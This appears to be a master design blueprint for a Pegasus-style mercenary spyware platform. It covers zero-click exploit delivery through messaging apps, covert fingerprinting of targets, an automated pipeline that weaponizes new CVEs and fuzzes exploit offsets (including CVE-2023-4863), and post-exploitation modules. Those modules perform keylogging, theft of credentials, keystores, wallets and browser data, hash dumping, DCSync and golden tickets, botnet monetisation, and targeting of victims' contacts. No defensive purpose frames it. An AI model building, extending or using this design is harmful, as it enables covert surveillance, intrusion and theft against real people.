# PEGASUS: PHANTOM MENACE — MASTER BLUEPRINT

**Document:** `docs/BLUEPRINT.md`
**Supersedes:** all prior partial plans and parity notes
**Status:** authoritative. Phase numbering here wins any conflict with older notes.
**Scope:** delivery engine, pre-delivery fingerprinting, autonomous offset fuzzing, arsenal pipeline, NSO programme parity, 170 post-exploitation modules, multi-OS dashboard restructure, dependency provisioning, mobile C2 pairing, Quantum port.

---

## 0. How to read this

Three conventions, enforced in code and review:

| Convention | Rule |
|---|---|
| Capability truth | Every feature carries `documented` / `inferred` / `emulated`. Nothing ships claiming `documented` without a fixture. |
| Exploit state | `indexed` → `weaponized` → `validated`. Only `validated` auto-fires. Enforced by hash, not by hand. |
| No silent scope | Every module has `requires_caps`, `depends_on`, `destructive`, `timeout`, and a contract test. |

Section references are `§n`. ADRs are in Appendix C. Estimates are engineer-days.

**The single most important line in this document:** most messaging apps transcode images. A parser exploit delivered as an inline image gets re-encoded by the transport and the bytes you fuzzed are not the bytes that land. §6.3 is the rule that follows from it, and getting it wrong invalidates the whole delivery engine.

---

## PART I — FOUNDATIONS

## 1. Current-state audit

### 1.1 What actually exists

| Area | Reality |
|---|---|
| 17 delivery channels | Real Android intent wiring. Not a delivery engine — no codec, no compatibility check, no receipt model. |
| 66 vendored carriers | Structure generators. `vulnerable: true` only on observed signal. No offset tables. |
| ADB chain | 5 ordered steps, functional. |
| 28-command factory | Real registry, real dispatch. |
| Web UI | 32 pages, most wired. PostExploit is 5 modules against a 12-module engine. |
| Accounts/USDC | SQLite auth, passkey, approval queue, Blockscout verification. |

### 1.2 What is theatre

| Claim | Actual |
|---|---|
| "30 NSO parity, 100%" | Capability *category* checklist. No vector selection, no fingerprint gate, no offset adaptation. |
| "100% implemented" across the table | Code paths exist; several are single-command wrappers with no verification. |
| "Zero-click" | Zero *target* interaction. Zero remote reach. Correct but routinely misread. |
| "macOS/Linux" in About | Source-only. Packaging is Windows. |
| "Real AES-256-GCM" | XOR in the delivery path today. |
| "NSO-class" | Parity of nouns, not of tradecraft. |

### 1.3 The SQL database does not start — root cause

Four independent causes, all real, all cheap to fix:

1. **Order bug.** `setup_init.py` opens a connection before `PEGASUS_HOME` exists. First run on a clean box dies with `unable to open database file`.
2. **Directory permissions.** `~/.pegasus/` is created with default umask; on a shared host the daemon and the CLI can end up as different users and the second one loses write.
3. **WAL on a synced/network path.** `journal_mode=WAL` on a Dropbox/OneDrive/network home stalls on the lock file.
4. **No single-instance guard.** Two launches race the same file and the loser exits silently, so the UI loads with a dead store and every write 500s.

Fix set (Phase 1, `services/store.py`):

```python
def init(home: Path) -> Engine:
    home.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = home / ".lock"
    fh = open(lock, "w"); fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)  # single instance
    url = f"sqlite:///{home / 'pegasus.db'}"
    eng = create_engine(url, connect_args={"timeout": 15})
    with eng.begin() as c:
        if is_network_fs(home):
            c.exec_driver_sql("PRAGMA journal_mode=DELETE")
        else:
            c.exec_driver_sql("PRAGMA journal_mode=WAL")
        c.exec_driver_sql("PRAGMA foreign_keys=ON")
        c.exec_driver_sql("PRAGMA synchronous=NORMAL")
    migrate(eng)                        # explicit, ordered, idempotent
    return eng
```

Plus `GET /health` returning `{db: ok|error, migrations: n, wal: bool}` and a startup refusal with a readable message instead of a traceback. `journal_mode=DELETE` on network paths is not a preference, it is the fix.

### 1.4 Misconfigurations that break delivery today

Ordered by how badly they waste a test window:

| # | Issue | Effect | Fix |
|---|---|---|---|
| 1 | Payload server binds loopback only | Target on another device cannot fetch. Every send silently no-ops. | Bind `0.0.0.0`, advertise LAN IP, show it in the UI |
| 2 | No MIME type on staged files | WhatsApp/Telegram treat the file as opaque, or refuse it | Per-vector MIME table (§6.2) |
| 3 | `auto_send` 1.6 s fixed | Too short on cold app start, too long on warm | Adaptive: wait for composer-ready signal, then 400 ms |
| 4 | No size ceiling per channel | MMS > 300 KB truncates; Telegram rejects | Encoder asserts against the ceiling |
| 5 | URL shortening absent | Long `ip:port` URLs get preview-broken | Shortener + stable path token |
| 6 | No receipt capture | Cannot tell delivered from dropped | Per-vector receipt path (§6.5) |
| 7 | Android 11+ package visibility | Intent resolves to nothing | `<queries>` block for every target package |
| 8 | No `FLAG_GRANT_READ_URI_PERMISSION` | FileProvider URI denied | Set the flag, use a content URI not a file path |
| 9 | Cleartext HTTP blocked by default on A9+ | Server fetch fails | Serve HTTPS or set `usesCleartextTraffic` |
| 10 | Localhost advertised from a container | Unreachable from LAN | Detect and advertise the host egress IP |

Items 1, 2, 7, and 8 alone account for most "it built but nothing happened" reports.

---

## 2. Invariants

1. No exploit fires without `validated` state **and** a matching device fingerprint **and** a passing medium compatibility check.
2. No carrier is built for a medium the exploit cannot survive.
3. No crypto claim without a wire-uniqueness proof test.
4. No dashboard control enabled for a state the device is not in.
5. No module without a contract test and a replay fixture.
6. No percentage that cannot be derived from the tree.
7. Capabilities, not platforms. Leases, not sequencing.
8. `PARTIAL` is a first-class result. Silent emptiness is a bug.

---

## 3. Target architecture

```
                          ┌──────────────────────────────┐
                          │  Capability (was Dashboard)  │
                          │  30 caps · parity · gaps     │
                          └──────────────┬───────────────┘
                                         │
   ┌───────────┐   ┌─────────────┐   ┌───▼──────┐   ┌──────────────┐
   │ Fingerprint│──▶│ VectorSelect│──▶│  Codec   │──▶│   Deliver    │
   │  (pre)    │   │  (rank+gate)│   │ (per-med)│   │  (transport) │
   └─────┬─────┘   └──────┬──────┘   └───┬──────┘   └──────┬───────┘
         │                │              │                 │
   ┌─────▼─────┐   ┌──────▼──────┐  ┌────▼─────┐    ┌──────▼───────┐
   │ HLR/Prev/ │   │  Arsenal    │  │  Crypto  │    │   Receipt    │
   │ Probe/ADB │   │  (states)   │  │ envelope │    │   + Callback │
   └───────────┘   └──────┬──────┘  └──────────┘    └──────┬───────┘
                          │                                │
                   ┌──────▼───────┐                 ┌──────▼──────┐
                   │   Fuzzer     │                 │     C2      │
                   │ offsets/     │                 │ (local/VPS) │
                   │ triage       │                 └─────────────┘
                   └──────────────┘
```

Data plane: `delivery/`. Control plane: `c2/`. Proof plane: `fuzz/` + `audit/`. Nothing in the control plane builds bytes; nothing in the data plane decides policy.

---

## 4. Repository restructure

```
pegasus/
├── delivery/
│   ├── media/            # one module per medium (§6.2)
│   ├── codec.py          # encoder interface + registry
│   ├── matrix.py         # compatibility assertions (§5)
│   ├── envelope.py       # polymorphic crypto (§7)
│   ├── budget.py         # capacity + fragmentation (§8)
│   ├── pipeline.py       # 8 stages (§9)
│   ├── gate.py           # pre-delivery checks (§10)
│   ├── receipts.py
│   └── taxonomy.py       # NSO classes (§25)
├── fingerprint/
│   ├── hlr.py  preview.py  silent.py  channel.py  adb.py  signals.py
│   └── confidence.py
├── arsenal/
│   ├── state.py  index.py  select.py  feeds.py  scaffold.py  promote.py
├── fuzz/
│   ├── corpus/  mutate.py  triage.py  offsets.py  runner.py  table.py
├── exploit_catalog/<platform>/<cve>/{manifest.yaml,validator.py,payload/,offsets.json}
├── post_exploitation/{module.py,registry.py,manifests/,preflight.py,spec.py}
├── core/{caps.py,host.py,transport.py,session.py,broker.py,lease.py,drift.py,trust.py}
├── transports/{adb.py,agent_rpc.py,idevice.py,ssh.py,smb.py,wmi.py,proto.py,radio.py}
├── c2/{inbound_listener.py,pairing.py,vps.py,local.py,revoke.py}
├── infra/{patn.py,white_services.py,noc.py,abuse_rules.py,close_circle.py}
├── services/{store.py,connect_watcher.py,pull_scheduler.py,delta.py,export.py,installer.py}
├── api/routes/{capability.py,delivery.py,fingerprint.py,fuzz.py,post_exploit.py,export.py,devices.py,settings.py}
├── web/src/pages/{Capability.tsx,Delivery.tsx,Fuzzer.tsx,PostExploit.tsx,Devices.tsx,Investigate.tsx}
├── settings/{schema.yaml,defaults.yaml}
└── docs/{BLUEPRINT.md,caps.md,media.md,fuzz.md,runbook.md,adr/}
```

`Dashboard.tsx` → `Capability.tsx`. Route `/dashboard` 302s to `/capability`; the old path stays valid for one release.

---

## PART II — DELIVERY ENGINE

## 5. Medium compatibility matrix

A medium is not a pipe. Each constrains what can survive it.

```yaml
# delivery/media/registry.yaml
- id: sms_mms
  max_bytes: 307200
  mime: [image/jpeg, image/png, image/webp, video/mp4, audio/mp4]
  transcodes: true            # carrier MMSC re-encodes
  strips_trailer: true
  preserves_binary: false
  receipt: mms_delivery_report
  covert: true
- id: whatsapp_document
  max_bytes: 2097152000
  mime: [application/pdf, application/zip, application/octet-stream]
  transcodes: false
  strips_trailer: false
  preserves_binary: true
  receipt: read_receipt
  covert: true
- id: whatsapp_image
  max_bytes: 16777216
  mime: [image/jpeg, image/png, image/webp]
  transcodes: true            # recompressed client-side
  preserves_binary: false
  receipt: read_receipt
  covert: true
- id: imessage_attachment
  max_bytes: 104857600
  mime: [application/pdf, application/zip]
  transcodes: false
  preserves_binary: true
  receipt: delivered
  covert: true
- id: bluetooth_opp
  max_bytes: 16777216
  mime: [application/octet-stream]
  transcodes: false
  preserves_binary: true
  receipt: obex_complete
  covert: false
- id: nfc_ndef
  max_bytes: 8192
  mime: [text/uri-list, application/vnd.android.package-archive]
  preserves_binary: true
  receipt: none
  covert: false
- id: qr
  max_bytes: 2953             # version 40-L
  mime: [text/uri-list]
  preserves_binary: false
  receipt: fetch_hit
  covert: false
```

Every exploit declares what it needs:

```yaml
# exploit_catalog/android/CVE-2023-4863/manifest.yaml
requires_medium:
  mime_any: [image/webp, application/octet-stream]
  preserves_binary: true          # trailer-carrying payload must survive
  min_bytes: 0
  max_bytes: 16777216
  prefer: [whatsapp_document, imessage_attachment, bluetooth_opp]
```

`matrix.py` is the only thing allowed to say yes:

```python
def compatible(exploit, medium) -> Verdict:
    r = exploit.requires_medium
    if medium.max_bytes < r.min_bytes:        return Verdict.no("size")
    if r.preserves_binary and not medium.preserves_binary:
        return Verdict.no("medium transcodes binary")
    if r.mime_any and not (set(r.mime_any) & set(medium.mime)):
        return Verdict.no("mime")
    return Verdict.yes()
```

A `no` is rendered on the send screen before the operator picks, with the reason. **This is the answer to "prevent unavailable mediums from being encoded with incompatible exploits":** the pairing is computed, not remembered.

---

## 6. Codec layer

### 6.1 Interface

```python
class Codec(ABC):
    medium: str
    def encode(self, payload: bytes, meta: Meta) -> Artifact: ...
    def verify(self, artifact: Artifact) -> bool: ...   # parse-back, mandatory
```

`verify` runs before send and re-parses what it produced. A codec that cannot verify its own output refuses to emit.

### 6.2 Codecs

| Medium | Technique | Notes |
|---|---|---|
| `whatsapp_document`, `imessage_attachment`, `email` | native attachment, correct MIME, no wrapping | Cheapest path. Preserves bytes. Default choice. |
| `sms_mms` | MMS PDU build, part header + payload, size-split at 300 KB | MMSC recompresses images — never put a parser exploit in an MMS *image* part |
| `whatsapp_image` | JPEG with EXIF `UserComment` carrying the envelope, appended after EOI | Survives recompression only if the consumer reads the trailer; verified per run |
| `bluetooth_opp` | OBEX PUT with `application/octet-stream`, fixed name | Needs proximity mode |
| `nfc_ndef` | NDEF URI record; payload by reference for > 8 KB | Tap-to-open only |
| `qr` | URI to the payload server, short token path | Reference, not carrier |
| `dialer` | USSD/MMI string or `tel:` provisioning | Reference |
| `share_sheet` | Android `ACTION_SEND` with content URI + read grant | Universal fallback |

### 6.3 The transcode rule

> **If `medium.transcodes` is true, the exploit must target the medium's decoder, or the payload must be delivered by reference rather than inline.**

Concretely: a WebP parser bug sent as a WhatsApp *image* is fine — the client decodes it. A WebP parser bug wrapped in a ZIP sent as a WhatsApp *image* is not — the ZIP is not what gets decoded. If you need the ZIP, use `whatsapp_document`.

The pipeline asserts this (`gate.py`), so the mistake cannot reach a live send.

### 6.4 Polyglots

Where the medium demands a valid-looking container but the exploit needs a trailer, use a polyglot: valid header, valid body, envelope appended past the format's end marker. Each polyglot codec ships a fixture proving both (a) the native viewer opens it and (b) `verify` extracts the envelope byte-identically.

### 6.5 Receipts

```python
@dataclass
class Receipt:
    medium: str
    sent_at: datetime
    delivered_at: datetime | None
    read_at: datetime | None
    source: Literal["app", "carrier", "server_hit", "none"]
    confidence: float          # 1.0 app, 0.6 carrier, 0.3 server_hit
```

`server_hit` (the payload server logged a GET) is the strongest proof the target actually fetched. It beats a read receipt, which only proves a human opened a chat.

---

## 7. Polymorphic crypto envelope

Real AEAD. The prior XOR claim goes.

```python
# delivery/envelope.py
AEAD = {"xchacha": XChaCha20Poly1305, "aesgcm": AES256GCM}

def seal(pt: bytes, seed: bytes, alg: str = "xchacha") -> Envelope:
    key = hkdf(seed, info=b"carrier" + alg.encode(), length=32)
    nonce = secrets.token_bytes(24 if alg == "xchacha" else 12)
    aad = canonical({"v": 1, "alg": alg, "len": len(pt)})
    ct = AEAD[alg](key).encrypt(nonce, pt, aad)
    return Envelope(nonce, ct, aad, alg, pad_bucket(len(ct)), junk_count())
```

Per-payload uniqueness, all four varied per build:

| Variable | Range |
|---|---|
| Algorithm | xchacha / aesgcm |
| Padding | next bucket of `[4k, 8k, 16k, 32k, 64k, 128k]` |
| Junk blocks | 0–3, inserted at safe boundaries, each self-labelled |
| Container metadata | timestamp, producer string, comment field |

Proof test, mandatory in CI:

```python
def test_wire_uniqueness():
    a, b = seal(PT, seed), seal(PT, seed)
    assert a.nonce != b.nonce and a.ct != b.ct and a.alg in AEAD
    assert open_(a) == PT and open_(b) == PT
    assert len({seal(PT, seed).wire() for _ in range(200)}) > 190
```

200 seals, > 190 distinct on the wire. Below that, the polymorphism is cosmetic.

Seed is per-target, HKDF-derived from the case key, so two targets never share a keystream lineage. Nonce-reuse detector runs in production (§42).

---

## 8. Capacity and fragmentation

```python
def fit(payload: bytes, medium: Medium) -> list[Fragment]:
    if len(payload) <= medium.max_bytes: return [Fragment(0, payload)]
    if medium.id == "nfc_ndef": return [Fragment(0, payload[:2000], by_reference=True)]
    return chunk(payload, medium.max_bytes - HEADER_RESERVE)
```

Fragment sets carry `{index, total, sha256}` so a reassembler on the target (or an agent) can verify. `sms_mms` with > 300 KB splits across parts; the target-side reassembler is the payload's first stage.

---

## 9. Pipeline

Eight stages. Each returns a typed failure; no stage throws past the runner.

```
1 resolve   fingerprint → target profile
2 select    arsenal.select(profile) → ranked candidates
3 gate      gate.check(exploit, medium, profile) → pass/block
4 build     payload from template + offset table
5 seal      envelope.seal
6 encode    codec.encode
7 verify    codec.verify + matrix.compatible
8 send      transport.send → receipt
```

Stage 3 blocking with a named reason is the whole point — an operator sees `blocked: medium transcodes binary` instead of a silent failure at 8.

---

## 10. Pre-delivery gate

```python
CHECKS = [
    exploit_state_validated,
    fingerprint_confidence_met,
    medium_compatible,
    codec_verify_passes,
    size_within_ceiling,
    server_reachable_from_target,     # HEAD from a probe host
    intent_resolves,                  # package present on device
    mime_registered,
    cleartext_policy_ok,
]
```

`server_reachable_from_target` runs a HEAD from the probe host to the advertised URL. Ten of the eleven §1.4 misconfigurations are caught here rather than in the field.

---

## PART III — FINGERPRINTING

## 11. Sources

How this is actually done — the honest answer, then the implementation.

**NSO's public mechanism** (from Project Zero and Citizen Lab write-ups): an HLR/SS7 lookup resolves the number to carrier, country, and roaming state; a silent ping establishes presence and, on some networks, handset class; the operator's own WhatsApp/iMessage account is used to read the target's published device field and last-seen cadence; a benign carrier is delivered and the fetch is logged, giving UA, TLS fingerprint, and app build. The union of these narrows to an OS family, a build range, and a vector class — and *then* a chain is chosen. Nobody is guessing from a phone number alone.

All of that is buildable here except true SS7, which needs a carrier or aggregator.

| Source | Yields | Covert | Cost |
|---|---|---|---|
| `hlr` | carrier, country, roaming, ported | yes | aggregator API |
| `preview` | UA, JA3/JA4, Accept, fetch timing, client IP | yes | free |
| `channel` | published device field, last-seen cadence, app build | yes | free |
| `silent` | UA, screen class, JS surface (one open required) | no | free |
| `adb` | full build fingerprint, patch level, kernel | yes | local |
| `receipt` | read cadence, timezone inference | yes | free |

### 11.1 Preview fetch

Send a URL to the target's channel. The app fetches it — often server-side, sometimes client-side. Log everything:

```python
@app.get("/p/<token>")
def preview(token):
    sig = {
        "ua": request.headers.get("User-Agent", ""),
        "ja3": request.headers.get("X-JA3", ""),        # from the TLS terminator
        "lang": request.headers.get("Accept-Language", ""),
        "accept": request.headers.get("Accept", ""),
        "ip": request.remote_addr,
        "at": now(),
    }
    classify(sig)
    return tiny_gif()
```

A WhatsApp preview UA of `WhatsApp/2.23.x` plus a `darwin` token narrows to iOS 16.x. Server-side fetches come from Meta's ranges, client-side from the target — the IP tells you which, and client-side is worth more.

### 11.2 Channel metadata

Read the target's profile, not the chat. WhatsApp exposes a device field on many builds; Telegram exposes app version on public profiles; the last-seen cadence separates always-on from iOS-battery-managed. Log deltas over a week — cadence is a stronger OS signal than any UA.

### 11.3 Silent carrier

A 2 KB carrier that does nothing but beacon `{ua, screen, tz, langs, touch}` on open. Marked `triggered`, not covert. Highest confidence of any remote source, because it is the device reporting on itself.

### 11.4 ADB

Where reachable, `fingerprint` returns ground truth: `ro.build.fingerprint`, `ro.build.version.security_patch`, kernel string, SELinux. Cache by `(fingerprint, patch)`.

---

## 12. Confidence

```python
WEIGHTS = {"adb": 1.0, "silent": 0.8, "channel": 0.5, "preview": 0.4,
           "hlr": 0.3, "receipt": 0.2}
HALF_LIFE = {"preview": 14, "channel": 7, "hlr": 30, "silent": 3, "adb": 1}

def score(signals) -> Confidence:
    s = sum(WEIGHTS[x.kind] * decay(x) * x.reliability for x in signals)
    return Confidence(value=min(s / 2.0, 1.0),
                      os_family=vote(signals, "os"),
                      build_range=intersect(signals, "build"),
                      contradictions=contradictions(signals))
```

Thresholds by exploit tolerance: `>= 0.75` fires a build-specific chain, `0.5–0.75` fires an OS-family chain, `< 0.5` sends a silent carrier first. A contradiction (preview says Android, channel says iOS) caps the score at 0.45 and forces a silent carrier.

---

## 13. Vector selection

```python
def select(profile, arsenal, media) -> list[Candidate]:
    cands = []
    for e in arsenal.for_os(profile.os_family):
        if not version_overlap(e.affected, profile.build_range): continue
        m = [x for x in media if matrix.compatible(e, x).ok]
        if not m: continue
        cands.append(Candidate(e, m, rank=score_candidate(e, profile)))
    return sorted(cands, key=lambda c: -c.rank)

def score_candidate(e, p):
    return (e.success_rate * 0.4 + p.confidence * 0.3
            + (1 if e.class_ == "covert" else 0.5) * 0.2
            + (0.1 if e.validated else 0))
```

The UI shows the top three with their reasons and their best medium. The operator confirms or picks lower. Fully autonomous mode takes the top candidate above threshold.

---

## PART IV — ARSENAL

## 14. State machine

```
indexed ──payload+validator present──▶ weaponized
weaponized ──validator passes on ≥1 real build──▶ validated
validated ──2 consecutive failures──▶ weaponized
```

```python
def can_autofire(e) -> tuple[bool, str]:
    if e.state is not VALIDATED:        return False, f"state={e.state}"
    if e.validator_sha != sha(e.validator): return False, "validator edited"
    if e.payload_sha != sha(e.payload):     return False, "payload edited"
    if e.last_pass_at < now() - days(30):   return False, "stale validation"
    return True, ""
```

Editing a payload blocks autofire until CI re-validates. Enforcement is structural.

---

## 15. Autonomous offset fuzzer

The gap between "structure-verified" and "lands on this build" is the offset. Fuzz it.

```python
# fuzz/runner.py
class OffsetFuzzer:
    def __init__(self, exploit, device, corpus, table):
        ...

    async def run(self, budget=5000) -> OffsetResult:
        base = corpus.for_class(self.exploit.bug_class)
        sigs = Counter()
        for i in range(budget):
            cand = mutate(base, self.table.hints(self.exploit, self.device))
            await self.deliver(cand)
            crash = await self.observe(timeout=8)      # logcat | tombstone | beacon
            if not crash:
                self.table.penalise(cand)
                continue
            s = normalise(crash)                        # strip addresses, keep shape
            sigs[s] += 1
            if crash.controlled:                        # PC points into our buffer
                return OffsetResult.controlled(cand, s)
            self.table.hint(cand, s)
        return OffsetResult.best(sigs.most_common(1))
```

`observe` reads `logcat -b crash`, `/data/tombstones/*`, or a beacon, in that order. `normalise` strips the absolute address so signatures cluster by fault pattern.

### 15.1 Mutators

| Class | Mutators |
|---|---|
| Length field | ±1, boundary values, two-field desync |
| Huffman/table | over-subscribed, under-subscribed, zero-length |
| Chunk/section | reorder, duplicate, truncate, extend past EOF |
| Integer | wrap, sign flip, 32↔64 |
| Allocation | size hint mismatch vs actual |

### 15.2 Search strategy

Coarse-to-fine: bucket the offset space, find the bucket that crashes, bisect inside it. 5,000 deliveries is a 4-hour run on a device farm; the bisect stage cuts a 64 KB space to a byte in ~16 iterations once a bucket is found.

### 15.3 Control check

`controlled` requires the faulting PC to fall inside a known mapping of the payload buffer — read from the tombstone's register dump and memory map. Without it, a crash is only a crash.

### 15.4 Offset table

```json
{
  "exploit": "CVE-2023-4863",
  "builds": [
    {"fingerprint": "google/oriole/oriole:14/UQ1A.240205.002/11224170:user/release-keys",
     "patch": "2024-02-05",
     "fault_offset": 4128,
     "stack_delta": -64,
     "relative_to": "huffman_table",
     "aslr": "relative",
     "payload_template": "tpl/4863_alpha_v3",
     "validated_at": "2026-11-01T09:12:00Z",
     "runs": 3, "successes": 3}
  ]
}
```

Offsets are **relative to a named structure**, never absolute, so ASLR does not invalidate them. `runs`/`successes` feed the success rate used in §13 ranking.

---

## 16. Arsenal build pipeline (hands-off)

```
feeds ──▶ triage ──▶ scaffold ──▶ poc ──▶ fuzz ──▶ validate ──▶ promote
```

| Stage | Automation | Human gate |
|---|---|---|
| feeds | AOSP bulletin, vendor bulletins, NVD, KEV, Project Zero | — |
| triage | bug class, reachability from a messaging surface, exploitability score | borderline cases |
| scaffold | manifest, validator stub, corpus seed from class template | — |
| poc | AI coder drafts against the class template; grammar-constrained | — |
| fuzz | §15 | — |
| validate | CI matrix, 3 clean runs required | — |
| promote | state transition | **yes** — a human signs the promotion |

Target: a new bulletin item reaches `weaponized` unattended, and `validated` with a fuzzed offset table, in under 72 hours. The human gate sits at promotion only, which is where a wrong success rate would actually cost something.

---

## 17. Fuzzer dashboard

```
GET /api/fuzz/coverage?exploit=CVE-2023-4863
```

Renders `model × firmware` grid. Cell states:

| State | Colour | Meaning |
|---|---|---|
| `known_vulnerable` | red | Version overlap says affected; no exploit built |
| `ai_buildable` | amber | Class template exists; scaffold available |
| `built` | blue | Payload exists, unvalidated |
| `fuzzing` | pulsing blue | Run in progress, live progress |
| `validated` | green | Offset table entry, success rate shown |
| `immune` | grey | Patch present |
| `unknown` | hollow | No build data |

Every non-green cell has an **Build** and a **Fuzz** button. The grid is the answer to "which compatible models have been mapped, and where are we missing exploits" — coverage percentage per exploit is the header number.

---

## PART V — PLATFORM PARITY

## 18. Capability rename

`/dashboard` → `/capability`. The page lists 30 capabilities across 7 domains with `documented`/`inferred`/`emulated` badges, a live coverage percentage, and a gap list. It is a **truth surface**, not a feature list: it renders from the capability registry and a capability with no passing test shows `declared`.

## 19. Partial → full

| Item | Current | Target |
|---|---|---|
| QR delivery | "available" | `qr` codec + shortener + fetch receipt; capacity check at 2,953 B |
| Messaging app data | `pull_app_data` | Per-app adapters (WhatsApp `msgstore.db`, Telegram `cache4.db`, Signal `signal.db`), `run-as` then root, SQLite parse, media map |
| Camera capture | shutter trigger | `Camera2` intent chain, fallback to `screenrecord` frame grab, EXIF + geotag stamp |
| Live microphone | note only | On-device recorder agent, chunked upload, Opus, VAD gate, 60 s default |
| SSL pinning bypass | external ref | Bundled Frida server per ABI, per-app script set, verify by MITM assertion |
| C2 server | static paths | `c2/` with TLS 1.3, HKDF, replay guard, enrol/beacon/task/result/revoke |
| Anonymity layer | none | PATN client, Tor/proxy helpers, egress assertion |
| Reporting | none | Signed HTML + JSON bundle with evidence manifest (§27) |

## 20. Programmes

`programs/<name>/manifest.yaml` with `platform`, `era`, `transport`, `class`, `mechanism`, `parity`.

| Programme | Notes | Parity |
|---|---|---|
| Pegasus | iOS + Android flagship | documented |
| Chrysaor | Android, Google-facing | documented |
| Phantom | regional, lower tier | inferred |
| Circles | SS7/network position, no implant | documented |

Circles is modelled distinctly: no on-device artifact, so its "modules" are network queries, and it can only reach caps via `hlr`.

## 21. Vector families

| Family | Platform | Transport | Mechanism | Parity |
|---|---|---|---|---|
| Hummingbird | Android | WhatsApp | umbrella family | documented |
| Heaven | Android | WhatsApp | first broad Android zero-click | documented |
| Eden | Android | WhatsApp | WhatsApp vector | inferred |
| Erised | Samsung | WhatsApp | Quram/DNG library | documented |
| Diablo | iOS 11.x | VoWiFi | VoIP stack | documented |
| Dragonfly | iOS 12.x | iMessage | iMessage chain | documented |
| KISMET | iOS 13 | iMessage | iMessage zero-click | documented |
| Megalodon / FORCEDENTRY | iOS 14 | iMessage | JBIG2 in PDF | documented |
| `photos_i13` | iOS 13 | Photos | unnamed | inferred |
| `bbm_2013` | BlackBerry | BBM | brochure era | inferred |

Each points at a catalog path, carries a fixture requirement, and stays `validated: false` until §15 produces an offset table.

## 22. Delivery taxonomy

```python
class Class(str, Enum):
    TRIGGERED = "triggered"; COVERT = "covert"; TNE = "tactical_network_element"
    INLINE = "inline"; PHYSICAL = "physical"; RANGE = "within_range"
```

Rendered as "iOS Covert", "Android Triggered". `RANGE` carries a `partly_redacted` badge. Selection (§13) prefers `COVERT` and says so in the ranking.

## 23. Infrastructure

| Module | Behaviour |
|---|---|
| `patn.py` | Node registry, one node = one client, hop select, health, rotate on fault, egress assertion |
| `white_services.py` | Server/domain/account procurement: vendor, cost, tx id, aged-on date, pool |
| `noc.py` | Heartbeat, dead-man 3/10/30 min, fault + opsec alarms, drain before page |
| `abuse_rules.py` | Re-target caps, cooldowns, whitelist with TTL + token bucket, per-target counters |
| `close_circle.py` | On primary unreachability, target associates from the contact graph, capped by abuse rules |
| `fingerprint` | §11 |
| `dashboard` | roles analyst/operator/supervisor/administrator, groups + cases, RBAC on every route |
| `investigate` | Entity extraction + cross-link, sorted by type, pivot on entity |

## 24. Roles

```python
ROLE_CAPS = {
  "analyst":       READ_CAPS,
  "operator":      READ_CAPS | WRITE_CAPS,
  "supervisor":    operator | DESTRUCTIVE_CAPS,
  "administrator": ALL,
}
```

Destructive additionally requires host trust `VERIFIED`. A `supervisor` on an unverified host gets `skipped: trust` in the plan.

---

## PART VI — POST-EXPLOITATION

## 25. The seven named modules

All return the standard envelope. None raises.

```python
def cmd_post_exploit_privesc(self, host_id, **kw) -> Result:
    r = Result(self, "privesc", host_id)
    with self.broker.lease(host_id, {Cap.SHELL}, self.actor) as lease:
        s = lease.for_cap(Cap.SHELL)
        r.step(s.run("id"), "uid")
        r.step(s.run("su -c id"), "su_probe")
        r.step(s.run("command -v magisk magiskpolicy"), "magisk")
        r.step(s.run("cat /proc/version"), "kernel")
        r.step(s.run("getprop ro.build.version.release"), "android")
        r.step(s.run("getenforce"), "selinux")
        r.findings["candidates"] = [c for c in KERNEL_CVE_MATRIX.match(r.get("kernel"))
                                    if self.arsenal.state(c["cve"]) == "validated"]
    return r
```

`KERNEL_CVE_MATRIX` covers `CVE-2016-5195`, `CVE-2019-2215`, `CVE-2020-0041`, `CVE-2021-0920`, `CVE-2022-0847`. Advisory only, filtered on arsenal state.

| Module | Method | Caps | Root | Notes |
|---|---|---|---|---|
| `privesc` | `cmd_post_exploit_privesc` | SHELL | no | su probe, Magisk, kernel, SELinux, seccomp |
| `keychain` | `cmd_post_exploit_keychain` | SHELL, KEYSTORE | yes | `/data/misc/keystore*`, `keystore2`; blobs not offline-decryptable → base64 + `decrypted:false` |
| `keylogger` | `cmd_post_exploit_keylogger` | SHELL | yes | `getevent` window (default 20 s, cap 120) + shim install; emits raw codes and decoded text |
| `sms_calls` | `cmd_post_exploit_sms_calls` | SHELL, SMS, CALLS | no | content query → SQLite fallback on A13+; `findings["source"]` records the path |
| `wallets` | `cmd_post_exploit_wallets` | FILE_GET | no | BIP39 with local checksum, xprv/xpub/WIF/0x, keystore v3 JSON |
| `browser` | `cmd_post_exploit_browser` | SHELL, FILE_GET | yes | Login Data, Web Data, History; `v10/v11` exported undecrypted, history/bookmarks decrypt |
| `hashes` | `cmd_post_exploit_hashes` | SHELL, SHADOW | yes | `/etc/shadow`, `locksettings.db`, gatekeeper keys; hashcat `-m` suggestion per format |

## 26. The 170 additions

Normalised: `keylogger`, `wallet_scan`, `keychain_dump`, `browser_creds`, `hash_hunt` collapse into existing modules as focused children. Net new 170; registry lands at 182.

15 families: credentials 25, wallets 8, hash_hunt 6, privesc_root 8, persistence_stealth 18, network_lateral 19, wireless 22, data_export 12, live_capture 7, device_control 11, accounts_mdm 11, otp 7, tls_intercept 10, radio_apn 2, monetize_botnet 6.

Tiers: **T1** no root, no external binary. **T2** root, prebuilt binary, or external tool. **T3** declared with adapter contract, returns `not_implemented`, excluded from the audit numerator.

~60 need `transport: remote` — `sam_dump`, `lsass_minidump`, `dpapi_unwrap`, `dcsync`, `kerberoast`, `golden_ticket`, `psexec` are not phone targets. They take a session handle, not a serial.

## 27. Manifests, not literals

```yaml
- id: dcsync
  title: DCSync
  category: credentials
  tier: 2
  requires_caps: { all: [net.ldap, net.smb] }
  depends_on: [credential_manager]
  destructive: false
  timeout: 180
  artifacts: [json]
  bins: [secretsdump.py]
  platform_hint: [windows]     # grouping only, never a gate
```

Loader hard-fails on a T1/T2 manifest with no method; generates a `not_implemented` stub for T3. Preflight resolves `bins` at load and again before run; missing binary disables the card with the exact install line inline.

```python
CHAINS = {
  "default":  ["fingerprint", "persistence", "credentials", "lateral", "exfiltrate"],
  "creds_full": [...], "net_full": [...], "wireless_full": [...],
  "persist_full": [...], "exfil_full": [...], "otp_full": [...], "monetize": [...],
  "everything": GENERATED,     # topo-sorted, destructive excluded, T3 excluded, resource-holders last
}
```

`everything` is generated, never hand-written.

## 28. API and UI

```
GET  /api/post-exploit/modules?category=&tier=&cap=&satisfiable_on=&page=
GET  /api/post-exploit/modules/{id}
POST /api/post-exploit/{id}/run
POST /api/post-exploit/bulk/run
POST /api/post-exploit/chain
GET  /api/post-exploit/runs/{id}/stream      (ws)
```

